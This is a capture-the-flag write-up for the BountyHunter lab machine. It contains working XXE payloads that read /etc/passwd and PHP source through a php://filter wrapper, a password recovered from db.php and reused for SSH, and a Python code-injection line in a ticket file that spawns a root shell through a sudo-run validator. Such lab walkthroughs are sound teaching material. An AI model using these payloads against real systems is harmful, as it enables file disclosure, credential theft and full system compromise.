First of all we run our nmap scan

```sh

- Navigating to port 80 - http, gives us a website

![](https://i.imgur.com/no9CW9K.png)

- viewing source doesn't seems to have anything much except from a few clues to test out vulnerabilities on the website with a security tool called `Burp Suite`

![](https://i.imgur.com/ZpmMhil.png)

- Also clicking `portal` on the web page :

![](https://i.imgur.com/DsP1Zwf.png)

- Takes us here :

- But after clicking `Go here` on the web page we get another web page, which looks like a **Bounty Report System** (Trust me, shit doesn't work)

![](https://i.imgur.com/6FHV1Eg.png)

- Fired up `Burp suite` and after numerous test, i noticed that this page is vulnerable to `XXE injection`

*payload :*

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

- Just to be sure we are doing the right thing, Directory Bruteforce:

```sh
sec-fortress@Pwn-F0rk-3X3C:~/HTB/BountyHunter$ gobuster dir -u http://10.10.11.100/ -w ~/SecLists-master/Discovery/Web-Content/big.txt -b 401,400,400,501,402,404,403 -x bak,zip,php,PHP,txt,html -t 40 2>/dev/null

- Yeah, definitely we can read files on the server, Now we need one more important file, maybe some file containing stored ssh creds
- After much Enumeration i decided to check each and every directory from our scan with gobuster, i found out db.php contains an empty page, why?? ðŸ¤”

![](https://i.imgur.com/7ifOLcR.png)

- After much reading, there is a way to print out content of php files through XXE injection using a php wrapper (*php://filter/convert.base64-encode/resource=file.php*), you can read more on it from [here](https://www.pwny.cc/web-attacks/xml-external-entity-xxe)
- Doing this to our target, gives us a base 64 encoded text

![](https://i.imgur.com/xziDR8I.png)

*payload :*
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
<data>&example;</data>
```

Looks like we got a password, let try it out on SSH with the user `development`

- It works :

### Privilege Escalation

> Since we have gotten shell as a normal user in the default home directory, let escalate privileges ðŸ˜€

- First of all i ran `sudo -l` to confirm if there are executables/binaries we can run with sudo

![](https://i.imgur.com/pDz1CSj.png)

- There is, looks like a ticket validator, let see what we can do with it 

![](https://i.imgur.com/RbsFNYp.png)

Just a python file that validates ticket ðŸ¤”, let us read source-code

![](https://i.imgur.com/kYRmVgn.png)

- hmmmmmm, here is what i think :
	1. When it prompts us for a ticket file, we need to specify a file with a markdown format
	2. Once this is validated, it opens the file and check if the first line has > `# Skytrain Inc`
	3. Also checks if the second line has > `## Ticket to `
	4. It then looks for a line with numbers that add up to each other greater than 100

- i decided to change to the `/opt/skytrain_inc/invalid_tickets` folder and saw sample code

![](https://i.imgur.com/7ezkild.png)

- since we are not able to to write to this file, i created a sample and directed it to /tmp and named it `segun.py`, then gave it `777` permmissions

![](https://i.imgur.com/k7CLY9G.png)

- i edited the file and changed it from this :

```md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
```

To this:

```md
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**18 + __import__('os').system('/bin/bash')**
##Issued: 2021/04/06
#End Ticket
```

- ... and we got Root, Bankkaaaaiii ðŸŽŽ
